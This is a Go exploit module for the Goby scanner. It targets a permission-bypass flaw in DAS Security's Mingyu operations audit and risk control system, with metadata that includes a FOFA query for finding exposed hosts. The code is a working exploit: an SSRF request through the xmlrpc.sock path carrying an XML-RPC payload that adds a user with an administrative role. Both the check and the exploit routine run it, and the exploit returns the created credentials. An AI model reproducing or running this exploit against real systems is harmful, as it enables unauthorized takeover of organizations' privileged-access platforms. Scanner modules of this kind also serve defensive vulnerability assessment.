package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Anhengming Royal Operation and Maintenance Audit and Risk Control System xmlrpc.sock permission bypass vulnerability",
    "Description": "<p>Anheng's Mingyu operation and maintenance audit and risk control system is a solution designed to provide safe operation and maintenance management and audit of operation and maintenance activities. Through this system, organizations can achieve comprehensive control and audit of access and operations of critical assets, ensure asset security, and meet compliance requirements.</p><p>Attackers can use the SSRF vulnerability in the xmlrpc.sock interface of the Mingyu operation and maintenance audit and risk control system to add any user to control the entire platform.</p>",
    "Product": "DAS_Security-Mingyu-OPS-ARCS",
    "Homepage": "https://www.dbappsecurity.com.cn/",
    "DisclosureDate": "2023-08-17",
    "PostTime": "2023-12-19",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"明御运维审计\" || header=\"Set-Cookie: USM=\" || banner=\"Set-Cookie: USM=\"",
    "GobyQuery": "body=\"明御运维审计\" || header=\"Set-Cookie: USM=\" || banner=\"Set-Cookie: USM=\"",
    "Level": "2",
    "Impact": "<p>Attackers can use the SSRF vulnerability in the xmlrpc.sock interface of the Mingyu operation and maintenance audit and risk control system to add any user to control the entire platform.</p>",
    "Recommendation": "<p>1. Update official security patches or upgrade to the latest version: <a href=\"https://www.dbappsecurity.com.cn\">https://www.dbappsecurity.com.cn</a></p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,auto",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "w6ojtu",
            "show": "attackType=custom"
        },
        {
            "name": "password",
            "type": "input",
            "value": "sTSegWpiFk",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "安恒明御运维审计与风险控制系统 xmlrpc.sock 权限绕过漏洞",
            "Product": "安恒信息-明御运维审计与风险控制系统",
            "Description": "<p>安恒的明御运维审计与风险控制系统是一款旨在提供安全运维管理和运维活动审计的解决方案。通过该系统，组织能够实现对关键资产的访问和操作的全面控制和审计，保障资产安全，并满足合规要求。</p><p>攻击者可以通过明御运维审计与风险控制系统 xmlrpc.sock 接口 SSRF 漏洞，可以添加任意用户控制整个平台。<br></p>",
            "Recommendation": "<p>1、更新官方发布的安全补丁或升级到最新版：<a href=\"https://www.dbappsecurity.com.cn\">https://www.dbappsecurity.com.cn</a></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可以通过明御运维审计与风险控制系统 xmlrpc.sock 接口 SSRF 漏洞，可以添加任意用户控制整个平台。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Anhengming Royal Operation and Maintenance Audit and Risk Control System xmlrpc.sock permission bypass vulnerability",
            "Product": "DAS_Security-Mingyu-OPS-ARCS",
            "Description": "<p>Anheng's Mingyu operation and maintenance audit and risk control system is a solution designed to provide safe operation and maintenance management and audit of operation and maintenance activities. Through this system, organizations can achieve comprehensive control and audit of access and operations of critical assets, ensure asset security, and meet compliance requirements.</p><p>Attackers can use the SSRF vulnerability in the xmlrpc.sock interface of the Mingyu operation and maintenance audit and risk control system to add any user to control the entire platform.</p>",
            "Recommendation": "<p>1. Update official security patches or upgrade to the latest version: <a href=\"https://www.dbappsecurity.com.cn\">https://www.dbappsecurity.com.cn</a></p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can use the SSRF vulnerability in the xmlrpc.sock interface of the Mingyu operation and maintenance audit and risk control system to add any user to control the entire platform.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10899"
}`
	addUserdasdbnhb878asd := func(hostinfo *httpclient.FixUrl, username, password string) (*httpclient.HttpResponse, error) {
		addRequestConfig := httpclient.NewPostRequestConfig("/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://" + goutils.RandomHexString(4) + "/wsrpc")
		addRequestConfig.VerifyTls = false
		addRequestConfig.FollowRedirect = false
		addRequestConfig.Header.Store("Content-Type", "application/xml")
		addRequestConfig.Data = `<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>10.0.0.1</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>` + username + `</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>` + username + `</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>` + password + `</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>102</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>`
		return httpclient.DoHttpRequest(hostinfo, addRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			username := `819507cq`
			password := `aaaaaaaaaaaadadas`
			resp, _ := addUserdasdbnhb878asd(hostinfo, username, password)
			return strings.Contains(resp.Utf8Html, `\u7528\u6237\u5df2\u5b58\u5728`) || strings.Contains(resp.Utf8Html, `PASSWORD_NO_LOWERCASE`) || strings.Contains(resp.Utf8Html, `PASSWORD_NO_DIGITAL`) || (strings.Contains(resp.Utf8Html, "authmode") && strings.Contains(resp.Utf8Html, username) && strings.Contains(resp.Utf8Html, "rolename"))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var username, password string
			if attackType == "auto" {
				username = goutils.RandomHexString(10)
				password = goutils.RandomHexString(10) + "2Az"
			} else if attackType == "custom" {
				username = goutils.B2S(ss.Params["username"])
				password = goutils.B2S(ss.Params["password"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			if resp, err := addUserdasdbnhb878asd(expResult.HostInfo, username, password); resp != nil && (strings.Contains(resp.Utf8Html, `\u7528\u6237\u5df2\u5b58\u5728`) || strings.Contains(resp.Utf8Html, `PASSWORD_NO_LOWERCASE`)) {
				expResult.Output = `用户已经存在`
			} else if resp != nil && strings.Contains(resp.Utf8Html, "authmode") && strings.Contains(resp.Utf8Html, username) && strings.Contains(resp.Utf8Html, "rolename") {
				expResult.Output = "username: " + username + "\n" + "password: " + password
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = "漏洞利用失败"
			}
			return expResult
		},
	))
}
